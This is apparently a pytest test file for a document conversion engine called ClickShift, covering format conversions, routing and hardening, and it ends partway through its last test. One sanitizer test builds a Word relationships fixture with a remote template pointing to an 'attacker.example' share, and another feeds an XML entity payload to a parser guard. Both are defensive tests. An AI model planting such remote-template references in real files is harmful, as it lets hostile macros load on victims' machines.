"""Cross-platform unit tests for the ClickShift engine (run anywhere)."""
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
os.environ["CLICKSHIFT_HOME"] = str(Path(__file__).parent / "_tmp_home")

import pytest  # noqa: E402
from clickshift.engine import ConversionEngine, newest_target_for, _routes_for  # noqa: E402


@pytest.fixture()
def engine():
    return ConversionEngine(enable_ml=False)


def test_newest_generation_targets():
    assert newest_target_for("pdf")[0] == "docx"      # latest Word, not .doc
    assert newest_target_for("doc")[0] == "docx"      # legacy -> modern
    assert newest_target_for("xls")[0] == "xlsx"
    assert newest_target_for("ppt")[0] == "pptx"
    assert "doc" not in newest_target_for("docx")     # never downgrade


def test_routes_prefer_fastest(engine):
    routes = [r.name for r in _routes_for(".png", ".jpg")]
    assert routes and routes[0] == "pillow"           # C-speed path first


def test_png_to_jpg_roundtrip(tmp_path, engine):
    from PIL import Image

    src = tmp_path / "a.png"
    Image.new("RGBA", (64, 32), (10, 200, 30, 255)).save(src)
    res = engine.convert(src, "jpg")
    assert res.ok, res.error
    out = tmp_path / "a.jpg"
    assert out.exists()
    with Image.open(out) as im:
        assert im.size == (64, 32)


def test_txt_to_docx(tmp_path, engine):
    src = tmp_path / "note.txt"
    src.write_text("# Title\nHello **world**\n- one\n- two\n", encoding="utf-8")
    res = engine.convert(src, "docx")
    assert res.ok, res.error
    import docx

    d = docx.Document(str(tmp_path / "note.docx"))
    text = "\n".join(p.text for p in d.paragraphs)
    assert "Title" in text and "one" in text
    # verify it is a real OOXML zip (Word 2007+ generation)
    import zipfile

    assert zipfile.is_zipfile(tmp_path / "note.docx")


def test_docx_to_txt(tmp_path, engine):
    import docx

    d = docx.Document()
    d.add_paragraph("Alpha")
    d.add_paragraph("Beta")
    f = tmp_path / "x.docx"
    d.save(f)
    res = engine.convert(f, "txt")
    assert res.ok, res.error
    assert "Alpha" in (tmp_path / "x.txt").read_text(encoding="utf-8-sig")


def test_missing_source(engine):
    res = engine.convert("/nope/missing.pdf", "docx")
    assert not res.ok


def test_unsupported_pair_returns_error(tmp_path, engine):
    f = tmp_path / "weird.zzz"
    f.write_bytes(b"\x00\x01")
    res = engine.convert(f, "qqq")
    assert not res.ok  # must fail loudly rather than produce garbage


def test_large_text_not_truncated(tmp_path, engine):
    """Files > 200 KB must be converted in full (regression test for _read_text_auto)."""
    src = tmp_path / "big.txt"
    payload = ("Line0123456789\n" * 20_000) + "TAIL_MARKER_END\n"  # ~300 KB
    assert len(payload.encode("utf-8")) > 250_000
    src.write_text(payload, encoding="utf-8")
    res = engine.convert(src, "html")
    assert res.ok, res.error
    out_text = Path(res.target).read_text(encoding="utf-8")
    assert "TAIL_MARKER_END" in out_text


def test_pdf_to_docx_routes_present(engine):
    """PDF -> DOCX must always have at least one pure-Python or native route."""
    routes = [r.name for r in _routes_for(".pdf", ".docx")]
    assert routes, "PDF -> DOCX must have conversion routes"
    assert any(r in routes for r in ("pdf2docx", "pymupdf-docx", "pypdf-docx", "office-com", "libreoffice"))


# ---- pdf2docx shading fixes (translucent panels -> per-line dark highlight) -- #

def test_translucent_fill_blended_over_white():
    from clickshift.engine import _flatten_path_opacity
    dark = (0.145, 0.157, 0.169)
    out = _flatten_path_opacity([
        {"fill": dark, "fill_opacity": 0.1, "color": None},
        {"fill": (1, 0, 0), "fill_opacity": 1.0},
        {"fill": dark, "fill_opacity": 0.0, "color": None},  # invisible -> dropped
    ])
    assert len(out) == 2
    assert all(c > 0.9 for c in out[0]["fill"])          # light grey, not charcoal
    assert out[0]["fill_opacity"] == 1.0
    assert out[1]["fill"] == (1, 0, 0)


def _line_table(text, fill="e9e9e9", ind=0, width=10000):
    return (
        f'<w:tbl><w:tblPr><w:tblInd w:w="{ind}" w:type="dxa"/></w:tblPr>'
        f'<w:tblGrid><w:gridCol w:w="10566"/></w:tblGrid><w:tr><w:trPr>'
        f'<w:trHeight w:hRule="exact" w:val="280"/></w:trPr><w:tc><w:tcPr>'
        f'<w:tcW w:type="dxa" w:w="{width}"/><w:shd w:fill="{fill}"/></w:tcPr>'
        f'<w:p><w:pPr><w:ind w:left="0"/></w:pPr><w:r><w:t>{text}</w:t></w:r></w:p>'
        f'</w:tc></w:tr></w:tbl>'
    )


_SPACER = ('<w:p><w:pPr><w:spacing w:line="20" w:lineRule="exact" w:before="0" '
           'w:after="0"/></w:pPr></w:p>')


def test_shaded_line_tables_merged_into_one_box():
    from clickshift.engine import _merge_shaded_line_tables
    ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    body = (_line_table("Header", fill="e60000") + _SPACER
            + _line_table("line one") + _SPACER + _line_table("line two", ind=60, width=9000)
            + _SPACER + _line_table("line three"))
    xml = f'<w:document {ns}><w:body>{body}</w:body></w:document>'.encode()
    out, merged = _merge_shaded_line_tables(xml)
    text = out.decode()
    assert merged == 2
    assert text.count("<w:tbl>") == 2                   # red header + one grey box
    assert "trHeight" not in text.split("line one")[0].split("e60000")[-1]
    assert text.index("line one") < text.index("line two") < text.index("line three")


def test_pdf_to_html_fidelity_multipage(tmp_path, engine):
    """PDF -> HTML routes via pymupdf-html and emits per-page scoped SVGs."""
    import fitz

    routes = [r.name for r in _routes_for(".pdf", ".html")]
    assert routes and routes[0] == "pymupdf-html"
    assert "pypdf" not in routes

    src = tmp_path / "sample.pdf"
    doc = fitz.open()
    for label in ("First", "Second"):
        page = doc.new_page(width=400, height=300)
        page.draw_rect(fitz.Rect(20, 20, 380, 70), color=(0.9, 0, 0), fill=(0.9, 0, 0))
        page.insert_text((36, 52), f"{label} Page", fontsize=18, color=(1, 1, 1))
    doc.save(src)
    doc.close()

    res = engine.convert(src, "html")
    assert res.ok, res.error
    assert res.backend == "pymupdf-html"
    html_text = Path(res.target).read_text(encoding="utf-8")
    assert html_text.count('<section class="page"') == 2
    assert html_text.count("<svg") == 2
    assert "#e60000" in html_text
    ids = __import__("re").findall(r'\bid="([^"]+)"', html_text)
    assert len(ids) == len(set(ids)), f"Duplicate SVG IDs across pages: {ids}"


def test_pdf_to_md_structured(tmp_path, engine):
    """PDF -> MD routes via pymupdf-md and emits real Markdown structure without BOM."""
    import fitz

    routes = [r.name for r in _routes_for(".pdf", ".md")]
    assert routes and routes[0] == "pymupdf-md"
    assert "pypdf" not in routes

    src = tmp_path / "paper.pdf"
    doc = fitz.open()
    page = doc.new_page(width=500, height=700)
    page.insert_text((72, 70), "My Paper Title", fontsize=18, fontname="helv")
    page.insert_text((72, 110), "1. Introduction", fontsize=14, fontname="hebo")
    page.insert_text((72, 140), "Hello ", fontsize=11, fontname="helv")
    page.insert_text((104, 140), "world", fontsize=11, fontname="hebo")
    page.insert_text((138, 140), " in Markdown.", fontsize=11, fontname="helv")
    page.insert_text((72, 175), "int main() {\n    return 0;\n}", fontsize=9, fontname="cour")
    page.insert_text((240, 660), "1", fontsize=10, fontname="helv")
    doc.save(src)
    doc.close()

    res = engine.convert(src, "md")
    assert res.ok, res.error
    assert res.backend == "pymupdf-md"
    raw = Path(res.target).read_bytes()
    assert not raw.startswith(b"\xef\xbb\xbf")  # clean UTF-8 without BOM
    md = raw.decode("utf-8")
    assert "# My Paper Title" in md
    assert "## 1. Introduction" in md
    assert "**world**" in md
    assert "```" in md and "return 0;" in md
    assert "\n1\n" not in md


def test_pptx_targets_and_routes():
    from clickshift.monitor import menu_targets

    for getter in (newest_target_for, menu_targets):
        assert "pptx" in getter("pdf")
        assert "pptx" in getter("docx")
        assert "pdf" in getter("pptx")
        assert "docx" in getter("pptx")

    assert "pymupdf-python-pptx" in [r.name for r in _routes_for(".pdf", ".pptx")]
    assert "python-docx-python-pptx" in [r.name for r in _routes_for(".docx", ".pptx")]
    assert "python-pptx-python-docx" in [r.name for r in _routes_for(".pptx", ".docx")]
    assert "python-pptx-pymupdf-pdf" in [r.name for r in _routes_for(".pptx", ".pdf")]


def test_pdf_to_pptx_text_and_scanned(tmp_path, engine):
    import io
    import fitz
    import pptx
    from PIL import Image

    img_buf = io.BytesIO()
    Image.new("RGB", (120, 80), (30, 120, 220)).save(img_buf, format="PNG")
    img_bytes = img_buf.getvalue()

    src = tmp_path / "deck_src.pdf"
    doc = fitz.open()
    p1 = doc.new_page(width=720, height=540)
    p1.insert_text((72, 90), "Quarterly Review", fontsize=24, fontname="hebo")
    p1.insert_text((72, 140), "Revenue grew cleanly.", fontsize=14, fontname="helv")
    p1.insert_image(fitz.Rect(72, 200, 252, 320), stream=img_bytes)

    # Scanned/image-only second page (no text spans)
    p2 = doc.new_page(width=720, height=540)
    p2.insert_image(fitz.Rect(40, 40, 680, 500), stream=img_bytes)
    doc.save(src)
    doc.close()

    res = engine.convert(src, "pptx")
    assert res.ok, res.error
    out = Path(res.target)
    assert out.suffix.lower() == ".pptx" and out.exists()

    prs = pptx.Presentation(str(out))
    assert len(prs.slides) == 2
    s1_text = "\n".join(sh.text_frame.text for sh in prs.slides[0].shapes if sh.has_text_frame)
    assert "Quarterly Review" in s1_text
    assert "Revenue grew cleanly." in s1_text
    assert any(hasattr(sh, "image") for sh in prs.slides[0].shapes)
    assert any(hasattr(sh, "image") for sh in prs.slides[1].shapes)


def test_docx_to_pptx_structured(tmp_path, engine):
    import io
    import docx
    import pptx
    from PIL import Image

    img_buf = io.BytesIO()
    Image.new("RGB", (100, 60), (200, 50, 50)).save(img_buf, format="PNG")
    img_buf.seek(0)

    d = docx.Document()
    d.add_paragraph("Annual Report", style="Title")
    d.add_paragraph("2026 Overview", style="Subtitle")
    d.add_heading("Key Metrics", level=1)
    d.add_paragraph("First bullet point", style="List Bullet")
    tbl = d.add_table(rows=2, cols=2)
    tbl.cell(0, 0).text = "Region"
    tbl.cell(0, 1).text = "Score"
    tbl.cell(1, 0).text = "EMEA"
    tbl.cell(1, 1).text = "98%"
    d.add_picture(img_buf, width=docx.shared.Inches(2.0))
    src = tmp_path / "report.docx"
    d.save(src)

    res = engine.convert(src, "pptx")
    assert res.ok, res.error
    prs = pptx.Presentation(str(res.target))
    assert len(prs.slides) >= 2
    all_text = "\n".join(
        sh.text_frame.text for sl in prs.slides for sh in sl.shapes if sh.has_text_frame
    )
    assert "Annual Report" in all_text
    assert "2026 Overview" in all_text
    assert "Key Metrics" in all_text
    assert "First bullet point" in all_text
    assert any(sh.has_table for sl in prs.slides for sh in sl.shapes)
    assert any(hasattr(sh, "image") for sl in prs.slides for sh in sl.shapes)


def test_pptx_to_docx_and_pdf_roundtrip(tmp_path, engine):
    import io
    import docx
    import fitz
    import pptx
    from pptx.util import Inches
    from PIL import Image
    from clickshift.engine import conv_pptx_to_pdf

    img_buf = io.BytesIO()
    Image.new("RGB", (90, 90), (20, 160, 90)).save(img_buf, format="PNG")
    img_buf.seek(0)

    prs = pptx.Presentation()
    prs.slide_width = Inches(13.333)
    prs.slide_height = Inches(7.5)

    s1 = prs.slides.add_slide(prs.slide_layouts[0])
    s1.shapes.title.text = "Slide One Title"
    s1.placeholders[1].text = "Opening summary point"
    s1.notes_slide.notes_text_frame.text = "Remember to pause here."

    s2 = prs.slides.add_slide(prs.slide_layouts[5])
    s2.shapes.title.text = "Data Breakdown"
    tshape = s2.shapes.add_table(2, 2, Inches(1.0), Inches(1.8), Inches(5.0), Inches(1.4))
    tshape.table.cell(0, 0).text = "Item"
    tshape.table.cell(0, 1).text = "Value"
    tshape.table.cell(1, 0).text = "Speed"
    tshape.table.cell(1, 1).text = "Fast"
    s2.shapes.add_picture(img_buf, Inches(7.0), Inches(1.8), width=Inches(2.0))

    src = tmp_path / "slides.pptx"
    prs.save(src)

    # 1. PPTX -> DOCX via engine
    res_docx = engine.convert(src, "docx")
    assert res_docx.ok, res_docx.error
    d = docx.Document(str(res_docx.target))
    doc_text = "\n".join(p.text for p in d.paragraphs)
    assert "Slide One Title" in doc_text
    assert "Opening summary point" in doc_text
    assert "Remember to pause here." in doc_text
    assert "Data Breakdown" in doc_text
    assert len(d.tables) == 1
    assert d.tables[0].cell(1, 1).text == "Fast"
    assert len(d.inline_shapes) == 1

    # 2. Pure-Python PPTX -> PDF fallback (direct check regardless of local PowerPoint)
    pure_pdf = tmp_path / "pure.pdf"
    conv_pptx_to_pdf(src, pure_pdf)
    assert pure_pdf.exists() and pure_pdf.stat().st_size > 0
    pdf_doc = fitz.open(str(pure_pdf))
    try:
        assert len(pdf_doc) == 2
        p1_txt = pdf_doc[0].get_text("text")
        p2_txt = pdf_doc[1].get_text("text")
        assert "Slide One Title" in p1_txt
        assert "Data Breakdown" in p2_txt
        assert "Fast" in p2_txt
    finally:
        pdf_doc.close()

    # 3. PPTX -> PDF via engine router
    res_pdf = engine.convert(src, "pdf")
    assert res_pdf.ok, res_pdf.error
    assert Path(res_pdf.target).stat().st_size > 0


def test_paged_docs_to_image_folder(tmp_path, engine):
    """Multi-page PDF, DOCX, and PPTX -> image format emit all pages in a document-named folder."""
    import docx
    import fitz
    import pptx
    from PIL import Image
    from clickshift.monitor import menu_targets

    for src_ext in ("pdf", "docx", "pptx"):
        for img_ext in ("png", "jpg", "webp"):
            assert img_ext in menu_targets(src_ext)
            assert img_ext in newest_target_for(src_ext)

    # 1. 3-page PDF -> PNG folder named after PDF stem, plus _unique_dir collision
    pdf_src = tmp_path / "my_slides.pdf"
    pdoc = fitz.open()
    for i in range(1, 4):
        pg = pdoc.new_page(width=400, height=300)
        pg.insert_text((40, 80), f"PDF Page {i}", fontsize=20)
    pdoc.save(pdf_src)
    pdoc.close()

    res_pdf_png = engine.convert(pdf_src, "png")
    assert res_pdf_png.ok, res_pdf_png.error
    out_dir = Path(res_pdf_png.target)
    assert out_dir == tmp_path / "my_slides"
    assert out_dir.is_dir()
    pages = sorted(out_dir.iterdir())
    assert [p.name for p in pages] == ["page_001.png", "page_002.png", "page_003.png"]
    with Image.open(pages[0]) as im:
        assert im.size[0] > 0 and im.size[1] > 0

    # Converting again to jpg must not overwrite my_slides/, creates my_slides_1/
    res_pdf_jpg = engine.convert(pdf_src, "jpg")
    assert res_pdf_jpg.ok, res_pdf_jpg.error
    out_dir_2 = Path(res_pdf_jpg.target)
    assert out_dir_2 == tmp_path / "my_slides_1"
    assert [p.name for p in sorted(out_dir_2.iterdir())] == ["page_001.jpg", "page_002.jpg", "page_003.jpg"]

    # 2. 2-page DOCX -> WEBP folder
    d = docx.Document()
    d.add_paragraph("First Word Page")
    d.add_page_break()
    d.add_paragraph("Second Word Page")
    docx_src = tmp_path / "notes_doc.docx"
    d.save(docx_src)

    res_docx_webp = engine.convert(docx_src, "webp")
    assert res_docx_webp.ok, res_docx_webp.error
    d_out = Path(res_docx_webp.target)
    assert d_out == tmp_path / "notes_doc" and d_out.is_dir()
    d_pages = sorted(d_out.iterdir())
    assert len(d_pages) >= 2
    assert all(p.suffix == ".webp" for p in d_pages)

    # 3. 2-slide PPTX -> PNG folder
    prs = pptx.Presentation()
    for idx in (1, 2):
        sl = prs.slides.add_slide(prs.slide_layouts[0])
        sl.shapes.title.text = f"Deck Slide {idx}"
    pptx_src = tmp_path / "pitch_deck.pptx"
    prs.save(pptx_src)

    res_pptx_png = engine.convert(pptx_src, "png")
    assert res_pptx_png.ok, res_pptx_png.error
    s_out = Path(res_pptx_png.target)
    assert s_out == tmp_path / "pitch_deck" and s_out.is_dir()
    assert [p.name for p in sorted(s_out.iterdir())] == ["page_001.png", "page_002.png"]


def test_selected_images_combine_in_order(tmp_path, monkeypatch):
    """Selecting multiple images in a custom order -> PDF / DOCX / PPTX preserves selection order."""
    import docx
    import fitz
    import pptx
    from PIL import Image
    from clickshift import cli
    from clickshift.monitor import menu_targets

    for fmt in ("pdf", "docx", "pptx"):
        assert fmt in menu_targets("png")
        assert fmt in newest_target_for("png")

    # Distinct sizes so order is unambiguously verifiable on output pages/slides/shapes
    specs = [
        ("c_first.png", (300, 100), (220, 20, 20)),    # wide (3:1)
        ("a_second.jpg", (100, 300), (20, 220, 20)),   # tall (1:3)
        ("b_third.png", (200, 200), (20, 20, 220)),    # square (1:1)
    ]
    ordered_paths = []
    for name, size, color in specs:
        p = tmp_path / name
        Image.new("RGB", size, color).save(p)
        ordered_paths.append(p)

    monkeypatch.setenv("CLICKSHIFT_NO_IPC", "1")
    monkeypatch.setenv("CLICKSHIFT_DISABLE_ML", "1")

    # 1. CLI ordered images -> PDF
    rc = cli.main(["convert", *(str(p) for p in ordered_paths), "-t", "pdf"])
    assert rc == 0
    pdf_out = tmp_path / "c_first.pdf"
    assert pdf_out.exists()
    doc = fitz.open(str(pdf_out))
    try:
        assert len(doc) == 3
        assert doc[0].rect.width > doc[0].rect.height     # wide
        assert doc[1].rect.height > doc[1].rect.width     # tall
        assert abs(doc[2].rect.width - doc[2].rect.height) < 1.0  # square
    finally:
        doc.close()

    # 2. CLI ordered images -> DOCX
    rc = cli.main(["convert", *(str(p) for p in ordered_paths), "-t", "docx"])
    assert rc == 0
    docx_out = tmp_path / "c_first.docx"
    assert docx_out.exists()
    wd = docx.Document(str(docx_out))
    assert len(wd.inline_shapes) == 3
    assert len(wd.paragraphs) == 3  # no extra blank page-break paragraphs
    assert not wd.paragraphs[0].paragraph_format.page_break_before
    assert all(p.paragraph_format.page_break_before for p in wd.paragraphs[1:])
    assert all((p.paragraph_format.space_after or 0) == 0 for p in wd.paragraphs)
    assert wd.inline_shapes[0].width > wd.inline_shapes[0].height
    assert wd.inline_shapes[1].height > wd.inline_shapes[1].width
    assert abs(wd.inline_shapes[2].width - wd.inline_shapes[2].height) < 10_000

    # 3. CLI ordered images -> PPTX
    rc = cli.main(["convert", *(str(p) for p in ordered_paths), "-t", "pptx"])
    assert rc == 0
    pptx_out = tmp_path / "c_first.pptx"
    assert pptx_out.exists()
    prs = pptx.Presentation(str(pptx_out))
    assert len(prs.slides) == 3
    pics = [[sh for sh in sl.shapes if hasattr(sh, "image")][0] for sl in prs.slides]
    assert pics[0].width > pics[0].height
    assert pics[1].height > pics[1].width
    assert abs(pics[2].width - pics[2].height) < 10_000


def test_ooxml_rels_sanitizer_strips_remote_template_and_preserves_hyperlink(tmp_path):
    import zipfile
    from clickshift.engine import _sanitize_ooxml_for_com

    src = tmp_path / "doc.docx"
    clean_dir = tmp_path / "sanitized"
    clean_dir.mkdir()
    rels = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="\\\\attacker.example\\share\\evil.dotm" TargetMode="External"/>'
        b'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
        b'Target="https://example.com" TargetMode="External"/>'
        b'</Relationships>'
    )
    with zipfile.ZipFile(src, "w") as z:
        z.writestr("[Content_Types].xml", b"<Types/>")
        z.writestr("word/_rels/settings.xml.rels", rels)

    safe = _sanitize_ooxml_for_com(src, clean_dir)
    assert safe != src
    with zipfile.ZipFile(safe, "r") as z:
        out_rels = z.read("word/_rels/settings.xml.rels").decode("utf-8")
    assert "attacker.example" not in out_rels
    assert "https://example.com" in out_rels


def test_epub_to_docx_without_temp_leak_and_entity_guard(tmp_path, engine):
    import docx
    import zipfile
    from clickshift.engine import _safe_xml_fromstring

    with pytest.raises(ValueError, match="DTD/ENTITY"):
        _safe_xml_fromstring(b'<!DOCTYPE x [<!ENTITY lol "x">]><x>&lol;</x>')

    epub = tmp_path / "book.epub"
    with zipfile.ZipFile(epub, "w") as z:
        z.writestr(
            "META-INF/container.xml",
            b'<?xml version="1.0"?><container version="1.0" '
            b'xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
            b'<rootfiles><rootfile full-path="OEBPS/content.opf" '
            b'media-type="application/oebps-package+xml"/></rootfiles></container>',
        )
        z.writestr(
            "OEBPS/content.opf",
            b'<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="2.0">'
            b'<manifest><item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>'
            b'<spine><itemref idref="c1"/></spine></package>',
        )
        z.writestr("OEBPS/ch1.xhtml", b"<html><body><p>Chapter One Safe Text</p></body></html>")

    out_docx = tmp_path / "book.docx"
    from clickshift.engine import conv_epub_extract
    conv_epub_extract(epub, out_docx)
    d = docx.Document(str(out_docx))
    assert "Chapter One Safe Text" in "\n".join(p.text for p in d.paragraphs)


def test_lo_convert_uses_hardened_temp_profile_and_cleans_up(tmp_path, monkeypatch):
    from clickshift import engine as eng_mod

    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", "soffice")
    src = tmp_path / "in.txt"
    dst = tmp_path / "out.pdf"
    src.write_text("hi", encoding="utf-8")
    seen = {}

    class _Proc:
        returncode = 0
        stderr = b""

    def fake_run(args, **_kw):
        env_arg = [a for a in args if str(a).startswith("-env:UserInstallation=")][0]
        prof_uri = env_arg.split("=", 1)[1]
        from urllib.parse import unquote, urlparse
        raw_path = unquote(urlparse(prof_uri).path)
        if os.name == "nt" and raw_path.startswith("/"):
            raw_path = raw_path[1:]
        pdir = Path(raw_path)
        xcu = pdir / "user" / "registrymodifications.xcu"
        seen["pdir"] = pdir
        seen["xcu"] = xcu.read_text(encoding="utf-8")
        dst.write_bytes(b"%PDF-1.4\n%%EOF\n")
        return _Proc()

    monkeypatch.setattr(eng_mod.subprocess, "run", fake_run)
    eng_mod.lo_convert(src, dst)
    assert "BlockUntrustedRefererLinks" in seen["xcu"]
    assert not seen["pdir"].exists()


def test_cli_filelist_preserves_order_and_cleans_up(tmp_path, monkeypatch):
    import fitz
    from PIL import Image
    from clickshift import cli

    imgs = []
    for name, sz in [("first.png", (200, 80)), ("second.png", (80, 200))]:
        p = tmp_path / name
        Image.new("RGB", sz, (10, 50, 200)).save(p)
        imgs.append(p)

    stage = tmp_path / "ClickShift" / "staging"
    stage.mkdir(parents=True)
    fl = stage / "batch_1.filelist"
    fl.write_text("\n".join(str(p) for p in imgs) + "\n", encoding="utf-8")

    monkeypatch.setenv("CLICKSHIFT_NO_IPC", "1")
    monkeypatch.setenv("CLICKSHIFT_DISABLE_ML", "1")
    rc = cli.main(["convert", "--filelist", str(fl), "-t", "pdf"])
    assert rc == 0
    assert not fl.exists()
    out_pdf = tmp_path / "first.pdf"
    doc = fitz.open(str(out_pdf))
    try:
        assert len(doc) == 2
        assert doc[0].rect.width > doc[0].rect.height
        assert doc[1].rect.height > doc[1].rect.width
    finally:
        doc.close()


def test_history_hashes_filenames_and_debuglog_redacts_home(tmp_path):
    import json
    from clickshift.learning import BanditSelector
    from clickshift.debuglog import render_report

    sel = BanditSelector(history_file=tmp_path / "history.jsonl")
    secret = tmp_path / "Confidential_Client_Contract.pdf"
    secret.write_bytes(b"%PDF-1.4\n")
    sel.record(secret, ".docx", "pdf2docx", 120.0, True)
    rec = json.loads((tmp_path / "history.jsonl").read_text(encoding="utf-8").splitlines()[-1])
    assert "Confidential" not in rec["file"]
    assert rec["file"].endswith(".pdf")

    home_sample = Path.home() / "Documents" / "secret.pdf"
    rep = render_report({"src": str(home_sample), "data_dir": str(Path.home() / ".clickshift")})
    assert str(Path.home()) not in rep
    assert "~/Documents" in rep or "~\\Documents" in rep


def test_backends_lazy_avoids_eager_probes_and_routes_cache_invalidates(monkeypatch):
    from clickshift import engine as eng_mod

    b = eng_mod.Backends()
    assert b.__dict__ == {"_probe_lock": b._probe_lock}
    probed: list[str] = []
    orig_probe = b._probe_attr

    def tracked_probe(name: str):
        probed.append(name)
        return orig_probe(name)

    monkeypatch.setattr(b, "_probe_attr", tracked_probe)
    _ = b.pillow
    assert probed == ["pillow"]

    routes = eng_mod._routes_for(".md", ".txt")
    assert [r.name for r in routes] == ["text-passthru"]

    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", "fake-soffice")
    r1 = [r.name for r in eng_mod._routes_for(".doc", ".pdf")]
    assert "libreoffice" in r1
    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", "")
    r2 = [r.name for r in eng_mod._routes_for(".doc", ".pdf")]
    assert "libreoffice" not in r2


def test_convert_many_batches_libreoffice_and_falls_back(tmp_path, monkeypatch):
    from clickshift import engine as eng_mod

    monkeypatch.setattr(eng_mod.BACKENDS, "office_app", {})
    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", "fake-soffice")

    docs = []
    for name in ("alpha", "beta", "gamma"):
        p = tmp_path / f"{name}.doc"
        p.write_text(f"doc {name}", encoding="utf-8")
        docs.append(p)
    txt = tmp_path / "note.txt"
    txt.write_text("hello", encoding="utf-8")

    batch_calls: list[list[tuple[Path, Path]]] = []
    fallback_calls: list[Path] = []

    def fake_lo_batch(pairs, dst_ext, infilter=None):
        batch_calls.append(list(pairs))
        ok_map = {}
        for src_p, dst_p in pairs:
            if src_p.stem == "gamma":
                ok_map[src_p] = False
            else:
                dst_p.write_bytes(b"%PDF-1.4\nbatch\n")
                ok_map[src_p] = True
        return ok_map, ""

    def fake_lo_single(src_p: Path, dst_p: Path, extra=None):
        fallback_calls.append(src_p)
        dst_p.write_bytes(b"%PDF-1.4\nsingle\n")

    monkeypatch.setattr(eng_mod, "_lo_convert_batch", fake_lo_batch)
    monkeypatch.setattr(eng_mod, "lo_convert", fake_lo_single)

    eng = eng_mod.ConversionEngine(enable_ml=False)
    try:
        jobs = [
            (str(docs[0]), "pdf"),
            (str(txt), "html"),
            (str(docs[1]), "pdf"),
            (str(docs[2]), "pdf"),
        ]
        results = eng.convert_many(jobs)
    finally:
        eng.shutdown()

    assert len(results) == 4
    assert all(r.ok for r in results)
    assert [Path(r.source).name for r in results] == ["alpha.doc", "note.txt", "beta.doc", "gamma.doc"]
    assert len(batch_calls) == 1 and len(batch_calls[0]) == 3
    assert fallback_calls == [docs[2]]
    assert Path(results[1].target).suffix == ".html"


def test_pptx_odp_and_text_routes_and_conversions(tmp_path, engine):
    """PPTX -> ODP, TXT, MD, HTML routes exist and produce valid non-empty outputs."""
    import io
    import zipfile
    import pptx
    from pptx.util import Inches
    from PIL import Image
    from clickshift.engine import conv_pptx_to_odp

    assert "python-pptx-odp" in [r.name for r in _routes_for(".pptx", ".odp")]
    for ext in (".txt", ".md", ".html"):
        assert "python-pptx-text" in [r.name for r in _routes_for(".pptx", ext)]

    img_buf = io.BytesIO()
    Image.new("RGB", (60, 40), (40, 120, 200)).save(img_buf, format="PNG")

    prs = pptx.Presentation()
    s1 = prs.slides.add_slide(prs.slide_layouts[0])
    s1.shapes.title.text = "Deck Heading"
    s1.placeholders[1].text = "Key takeaway"
    tshape = s1.shapes.add_table(2, 2, Inches(1.0), Inches(3.0), Inches(4.0), Inches(1.2))
    tshape.table.cell(0, 0).text = "Col1"
    tshape.table.cell(0, 1).text = "Col2"
    tshape.table.cell(1, 0).text = "Alpha"
    tshape.table.cell(1, 1).text = "Beta"
    s1.shapes.add_picture(img_buf, Inches(5.5), Inches(3.0), width=Inches(1.5))
    s1.notes_slide.notes_text_frame.text = "Speaker cue"

    src = tmp_path / "deck.pptx"
    prs.save(src)

    # Pure-Python ODP validator (OASIS ODF 1.2 package structure)
    odp_pure = tmp_path / "pure.odp"
    conv_pptx_to_odp(src, odp_pure)
    assert odp_pure.exists() and zipfile.is_zipfile(odp_pure)
    with zipfile.ZipFile(odp_pure, "r") as zf:
        names = zf.namelist()
        assert names[0] == "mimetype"
        info0 = zf.getinfo("mimetype")
        assert info0.compress_type == zipfile.ZIP_STORED
        assert zf.read("mimetype") == b"application/vnd.oasis.opendocument.presentation"
        assert "META-INF/manifest.xml" in names
        content = zf.read("content.xml").decode("utf-8")
        assert "Deck Heading" in content
        assert "Alpha" in content and "Speaker cue" in content
        assert any(n.startswith("Pictures/") for n in names)

    # Router conversion to ODP, TXT, MD, HTML
    for ext in ("odp", "txt", "md", "html"):
        res = engine.convert(src, ext)
        assert res.ok, f"pptx -> {ext} failed: {res.error}"
        out = Path(res.target)
        assert out.exists() and out.stat().st_size > 0
        if ext in ("txt", "md", "html"):
            body = out.read_text(encoding="utf-8-sig" if ext == "txt" else "utf-8")
            assert "Deck Heading" in body
            assert "Alpha" in body
            assert "Speaker cue" in body
            if ext == "html":
                assert "data:image/png;base64," in body


def test_pptx_to_pdf_theme_contrast_unicode_tight_and_groups(tmp_path):
    """conv_pptx_to_pdf preserves tight boxes, moved groups, white-on-theme fills, and Arabic/Unicode."""
    import fitz
    import pptx
    from pptx.dml.color import RGBColor
    from pptx.enum.dml import MSO_THEME_COLOR
    from pptx.util import Inches, Pt
    from clickshift.engine import conv_pptx_to_pdf

    prs = pptx.Presentation()
    prs.slide_width = Inches(10.0)
    prs.slide_height = Inches(5.625)
    sl = prs.slides.add_slide(prs.slide_layouts[6])

    # 1. White text on theme-colored filled box -> fill drawn, text kept white/visible
    sh_theme = sl.shapes.add_textbox(Inches(0.5), Inches(0.4), Inches(4.0), Inches(0.8))
    sh_theme.fill.solid()
    sh_theme.fill.fore_color.theme_color = MSO_THEME_COLOR.ACCENT_1
    r_theme = sh_theme.text_frame.paragraphs[0].add_run()
    r_theme.text = "ThemeBoxLabel"
    r_theme.font.color.rgb = RGBColor(255, 255, 255)
    r_theme.font.size = Pt(16)

    # 2. Explicit white text with NO fill on plain white slide -> contrast guard prevents white-on-white
    sh_ghost = sl.shapes.add_textbox(Inches(0.5), Inches(1.4), Inches(4.0), Inches(0.6))
    r_ghost = sh_ghost.text_frame.paragraphs[0].add_run()
    r_ghost.text = "ContrastGuardedText"
    r_ghost.font.color.rgb = RGBColor(255, 255, 255)
    r_ghost.font.size = Pt(14)

    # 3. Tight small textbox (< 9pt) -> must never be silently dropped
    sh_tight = sl.shapes.add_textbox(Inches(0.5), Inches(2.2), Inches(0.6), Inches(0.16))
